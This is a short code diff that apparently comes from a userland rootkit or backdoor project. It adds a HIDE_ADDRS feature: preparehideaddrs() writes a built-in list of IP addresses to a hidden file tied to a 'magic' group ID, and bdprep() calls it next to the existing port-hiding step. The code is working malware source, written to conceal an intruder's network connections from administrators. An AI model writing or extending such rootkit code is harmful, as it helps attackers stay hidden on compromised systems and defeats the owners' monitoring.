@@ -68,6 +68,28 @@ void preparehideports(gid_t magicgid){
 #endif
 
 
+#ifdef HIDE_ADDRS
+void preparehideaddrs(gid_t magicgid){
+    hook(CFOPEN, CACCESS);
+
+    if((long)call(CACCESS, HIDEADDRS, F_OK) == 0)
+        return;
+
+    if(prepareregfile(HIDEADDRS, magicgid) < 0)
+        return;
+
+    FILE *fp = call(CFOPEN, HIDEADDRS, "a");
+    if(fp == NULL) return;
+
+    for(int i=0; i < HIDEIPADDRS_SIZE; i++)
+        fprintf(fp, "%s\n", hideipaddrs[i]);
+
+    fclose(fp);
+}
+
+#endif
+
+
 void bdprep(void){
     char *curpath;
     gid_t magicgid = readgid();
@@ -85,6 +107,9 @@ void bdprep(void){
     }
 #ifdef HIDE_PORTS
     preparehideports(magicgid);
+#endif
+#ifdef HIDE_ADDRS
+    preparehideaddrs(magicgid);
 #endif
 
     if(regs+dirs != BDVPATHS_SIZE)
